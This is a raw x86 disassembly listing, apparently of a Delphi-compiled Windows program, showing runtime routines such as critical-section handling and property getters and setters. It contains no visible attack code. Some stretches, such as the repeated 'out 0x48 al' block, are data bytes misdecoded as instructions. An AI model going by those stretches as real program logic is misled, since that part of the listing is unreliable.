lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404310
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4142bd
lea eax [ ebp - 0x208 ]
call sub_4040ac
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4043b8
sub_414314
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_414304
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_414760
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_414388
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_414304
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_414304
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414908
sete al
xor eax eax
jmp r-xdata
sub_414424
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_414424
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_414470
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_414424
pop ecx
pop edx
retn
sub_4144b0
add [ eax ] cl
push esi
popad
jb r-xdata
cmc
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_414760
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4146e0
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4144bc
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41451d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_4050d0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414524
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4032b0
sub_41456c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4146e0
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_414760
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4145c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4145f8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4146e0
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414634
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403664
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414697
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41469e
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_414738
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403364
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414760
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414808
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4050d0
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_414818
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4148ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4148d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4050d8
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148d8
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403200
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404310
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_408020
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414918
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414987
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41498e
retn
call sub_4144bc
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405298
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404b54
mov eax rw-data
call sub_4040ac
mov eax rw-data
call sub_40f260
sub_414990
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414a31
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a38
retn
mov eax rw-data
call sub_414418
mov eax sub_40ef60
mov [ rw-data ] eax
mov eax sub_40eab0
mov [ rw-data ] eax
mov edx sub_40e9c0
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f260
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41400c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f574
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412564
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412c8c
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_414a3c
out 0x48 al
add [ edi + 0x640000ff ] ch
out 0x48 al
add [ eax + 0x640000ff ] dl
out 0x48 al
add [ ecx + 0x640000ff ] dl
out 0x48 al
add [ edx + 0x640000ff ] dl
out 0x48 al
add [ ebx + 0x640000ff ] dl
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] dl
dec eax
add [ ebp + 0x640000ff ] dl
out 0x48 al
add [ esi + 0x640000ff ] dl
out 0x48 al
add [ edi + 0x640000ff ] dl
out 0x48 al
add [ eax + 0x640000ff ] bl
out 0x48 al
add [ ecx + 0x640000ff ] bl
out 0x48 al
add [ edx + 0x640000ff ] bl
out 0x48 al
add [ ebx + 0x640000ff ] bl
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] bl
dec eax
add [ ebp + 0x640000ff ] bl
out 0x48 al
add [ esi + 0x640000ff ] bl
out 0x48 al
add [ edi + 0x640000ff ] bl
out 0x48 al
add [ eax + 0x640000ff ] al
out 0x48 al
add [ ecx + 0x640000ff ] al
out 0x48 al
add [ edx + 0x640000ff ] al
out 0x48 al
add [ ebx + 0x640000ff ] al
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] al
dec eax
add [ ebp + 0x640000ff ] al
out 0x48 al
add [ esi + 0x640000ff ] al
out 0x48 al
add [ edi + 0x640000ff ] al
out 0x48 al
add [ eax + 0x640000ff ] cl
out 0x48 al
add [ ecx + 0x640000ff ] cl
out 0x48 al
add [ edx + 0x640000ff ] cl
out 0x48 al
add [ ebx + 0x640000ff ] cl
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] cl
dec eax
add [ ebp + 0x640000ff ] cl
out 0x48 al
add [ esi + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_414b61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b68
retn
sub_414bac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414c6a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_414ba0
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_414ba0
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408288
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_404100
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_408020
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c71
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407f40
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404100
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_404310
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414c84
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414cd0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_414ba0
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4083c4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414c84
mov edx [ rw-data ]
mov eax esi
call sub_408020
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_408020
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4083c4
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414d34
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414da4
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414df8
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_414e28
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414e9c
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414ef8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414f3c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414fb8
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404348
mov ecx esp
mov edx esi
mov eax ebx
call sub_414f3c
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_415000
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414fec
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_415040
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414fec
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415080
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4150c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41519c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150cf
lea eax [ ebp - 0x4 ]
call sub_4047b8
retn
sub_4150d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415120
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404904
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_415284
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415127
lea eax [ ebp - 0x4 ]
call sub_4047b8
retn
sub_415130
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414f90
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_415000
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_415080
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_4040ac
pop ebx
retn
sub_415170
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414fb8
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_415040
pop ebx
retn
dec bl
je r-xdata
call sub_4150d8
jmp r-xdata
pop ebx
retn
sub_41519c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_415274
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_415130
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404904
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41527b
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4047f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4047b8
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415284
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41534a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404334
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_415170
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415351
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4047f4
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415358
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_414ba0
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_415398 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_414ba0
cmp [ eax ] 0x4
jne r-xdata
sub_415470
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_414ba0
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_4154b8 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4155e7 ]
jmp [ eax * 4 + jump_table_415554 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
